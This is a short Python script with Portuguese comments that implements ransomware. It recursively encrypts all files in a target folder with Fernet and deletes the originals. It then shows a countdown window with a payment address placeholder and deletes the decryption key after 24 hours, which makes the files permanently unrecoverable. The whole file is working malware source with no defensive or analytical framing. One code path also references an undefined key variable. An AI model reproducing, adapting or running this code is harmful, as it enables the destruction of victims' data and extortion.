#!/usr/bin/env python
# Arquivo de encriptar pasta
# by n1nr0d

import os
from cryptography.fernet import Fernet
import string
import random
import tkinter as tk
import time

# Endereço que será pedido para ser depositado a moeda/valor
endereco = "teste 123"

# Gerar uma senha aleatória com números, letras e caracteres especiais
def gerar_senha():
    caracteres = string.ascii_letters + string.digits + string.punctuation
    senha = ''.join(random.choice(caracteres) for _ in range(32))
    return senha

# Gravar a senha no arquivo
def gravar_senha(senha):
    with open("senha.txt", "w") as arquivo:
        arquivo.write(senha)

# Gravar a hora inicial real no arquivo
def gravar_hora_real(hora_real):
    with open("horareal.txt", "w") as arquivo:
        arquivo.write(str(hora_real))

# Obter a hora inicial real do arquivo
def obter_hora_real():
    if os.path.exists("horareal.txt"):
        with open("horareal.txt", "r") as arquivo:
            hora_real = int(arquivo.read())
        return hora_real
    else:
        return None

# Criptografar os arquivos de um diretório
def criptografar_arquivos(diretorio, chave):
    fernet = Fernet(chave)

    # Percorrer todos os arquivos no diretório
    for raiz, _, arquivos in os.walk(diretorio):
        for arquivo in arquivos:
            caminho_completo = os.path.join(raiz, arquivo)

            # Verificar se o arquivo não possui a extensão .encrypted
            if not arquivo.endswith(".encrypted"):
                # Ler o conteúdo do arquivo
                with open(caminho_completo, "rb") as f:
                    conteudo = f.read()

                # Criptografar o conteúdo do arquivo
                conteudo_criptografado = fernet.encrypt(conteudo)

                # Adicionar a extensão .encrypted ao nome do arquivo criptografado
                novo_nome = arquivo + ".encrypted"
                caminho_criptografado = os.path.join(raiz, novo_nome)

                # Gravar o conteúdo criptografado no novo arquivo
                with open(caminho_criptografado, "wb") as f:
                    f.write(conteudo_criptografado)

                # Remover o arquivo não criptografado
                os.remove(caminho_completo)

    print("Diretório criptografado com sucesso!")


# Nome do diretório que será criptografado
diretorio = "./p"

# Verificar se a chave de criptografia já foi gerada
if not os.path.exists("senha.txt"):
    # Gerar uma nova chave
    chave = Fernet.generate_key()
    # Converter a chave para uma string base64
    chave_base64 = chave.decode()
    # Gravar a chave no arquivo
    gravar_senha(chave_base64)
else:
    # Ler a chave de criptografia do arquivo
    with open("senha.txt", "r") as arquivo:
        chave_base64 = arquivo.read()

# Obter a hora inicial real
hora_real = obter_hora_real()

# Verificar se a hora inicial real existe
if hora_real is None:
    # Gravar a hora inicial real no arquivo
    hora_real = int(time.time())
    gravar_hora_real(hora_real)

    # Criptografar os arquivos do diretório
    criptografar_arquivos(diretorio, chave)

# Configurar o cronômetro para 24 horas (86400 segundos) a partir da hora inicial (Unix Epoch time)
tempo_atual = int(time.time())
tempo_limite = hora_real + 24 * 60 * 60
tempo_restante = tempo_limite - tempo_atual


# Função para atualizar o cronômetro e verificar se o tempo acabou
def atualizar_cronometro():
    global tempo_restante

    if tempo_restante > 0:
        tempo_restante -= 1

        minutos, segundos = divmod(tempo_restante, 60)
        horas, minutos = divmod(minutos, 60)

        tempo_restante_str = f"{horas:02d}:{minutos:02d}:{segundos:02d}"
        cronometro_label.config(text="Seu tempo restante: " + tempo_restante_str, fg="red")

        if tempo_restante == 0:
            os.remove("senha.txt")
            os.remove("horareal.txt")
            root.destroy()

        # Chamar a função novamente após 1 segundo
        root.after(1000, atualizar_cronometro)


# Criar a janela do cronômetro com um label e um botão para sair da aplicação
root = tk.Tk()
root.title("Cronômetro")
root.geometry("350x140")

# Define a cor de fundo da janela como preto
root.configure(background="black")

cronometro_label = tk.Label(root, font=("Arial", 16), text="Seu tempo restante: ", fg="red", bg="black")
cronometro_label.pack(pady=10)

endereco_label = tk.Label(root, font=("Arial", 14), text="Endereço: " + endereco, fg="white", bg="black")
endereco_label.pack()

sair_button = tk.Button(root, text="Sair", command=root.destroy)
sair_button.pack(pady=10)

# Inicia o cronômetro e exibir a janela principal da aplicação
atualizar_cronometro()
root.mainloop()
